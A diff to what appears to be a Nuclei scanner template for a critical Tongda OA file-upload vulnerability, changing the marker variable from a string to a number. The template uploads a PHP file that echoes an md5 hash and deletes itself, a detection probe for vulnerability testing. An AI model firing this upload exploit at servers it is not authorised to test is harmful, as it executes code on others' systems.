@@ -3,7 +3,7 @@ http:
   - part: body_2
     type: word
     words:
-    - '{{md5(string)}}'
+    - '{{md5(num)}}'
   - status:
     - 200
     type: status
@@ -51,7 +51,7 @@ http:
     Content-Type: application/octet-stream
 
 
-    <?php echo md5("{{string}}");unlink(__FILE__);?>
+    <?php echo md5({{num}});unlink(__FILE__);?>
 
     ------WebKitFormBoundaryjhddzlqp
 
@@ -86,4 +86,4 @@ info:
   severity: critical
   tags: tongda,fileupload,intrusive,router
 variables:
-  string: tongda-action-uploadfile
+  num: '999999999'
